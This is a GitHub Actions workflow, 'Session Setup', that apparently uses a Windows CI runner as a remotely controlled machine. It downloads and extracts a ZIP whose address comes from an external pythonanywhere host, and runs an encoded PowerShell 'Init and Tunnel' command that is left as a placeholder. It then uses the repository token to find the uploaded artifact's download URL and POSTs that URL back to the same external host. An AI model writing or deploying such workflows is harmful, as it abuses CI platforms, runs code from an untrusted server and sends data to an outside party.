name: Session Setup

on:
  workflow_dispatch:

jobs:
  job-alpha:
    runs-on: windows-2022
    timeout-minutes: 360

    steps:
      # Step 1: Checkout repository
      - name: Checkout repository
        uses: actions/checkout@v3

      # Step 2: Download artifact from external server and extract
      - name: Download and extract artifact from external server
        shell: pwsh
        run: |
          pip install requests
          python - <<'PYCODE'
import os, requests, zipfile, io

# Step A: Fetch JSON with artifact URL
resp = requests.get("https://azcaptchahh.pythonanywhere.com/geturl")
resp.raise_for_status()
artifact_url = resp.json()["url"]
print(f"[+] Got artifact URL: {artifact_url}")

# Step B: Download ZIP from URL
r = requests.get(artifact_url, stream=True)
r.raise_for_status()
print(f"[+] Downloaded {len(r.content)} bytes")

# Step C: Ensure Desktop\data exists
desktop_data = r"C:\Users\Administrator\Desktop\data"
os.makedirs(desktop_data, exist_ok=True)

# Step D: Extract contents
with zipfile.ZipFile(io.BytesIO(r.content)) as z:
    z.extractall(desktop_data)

print(f"[+] Extracted artifact to {desktop_data}")
PYCODE

      # Step 3: Init and Tunnel
      - name: Init and Tunnel
        shell: pwsh
        timeout-minutes: 2   # limit to 2 minutes
        run: |
          powershell -EncodedCommand "<FULL_ENCODED_COMMAND_OR_USE_POWERSHELL_SCRIPT>"

      # Step 4: List Desktop Data contents
      - name: List Desktop Data contents
        shell: cmd
        run: dir "C:\Users\Administrator\Desktop\data"
        continue-on-error: true

      # Step 5: Upload Desktop Data as artifact (always run)
      - name: Upload Desktop Data as "data" artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: data
          path: "C:\Users\Administrator\Desktop\data"

      # Step 6: Get artifact URL via GitHub API (curl + jq)
      - name: Get artifact URL
        if: always()
        id: get_artifact
        shell: bash
        env:
          REPO: ${{ github.repository }}
          RUN_ID: ${{ github.run_id }}
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "Fetching artifact metadata for run $RUN_ID ..."
          response=$(curl -s -H "Authorization: Bearer $TOKEN" \
                           -H "Accept: application/vnd.github+json" \
                           "https://api.github.com/repos/$REPO/actions/runs/$RUN_ID/artifacts")

          echo "Artifacts JSON: $response"

          # Get first artifact id
          artifact_id=$(echo "$response" | jq -r '.artifacts[0].id')

          echo "Got artifact id: $artifact_id"
          artifact_url="https://github.com/$REPO/actions/runs/$RUN_ID/artifacts/$artifact_id"

          echo "artifact_url=$artifact_url" >> $GITHUB_OUTPUT

      # Step 7: Send artifact download URL to external server (always run)
      - name: Send artifact download URL to external server
        if: always()
        env:
          ARTIFACT_URL: ${{ steps.get_artifact.outputs.artifact_url }}
        shell: bash
        run: |
          json="{\"url\": \"${ARTIFACT_URL}\"}"
          echo "Sending artifact URL ${ARTIFACT_URL} to external server via curl"
          curl -X POST "https://azcaptchahh.pythonanywhere.com/url" \
               -H "Content-Type: application/json" \
               -d "$json"
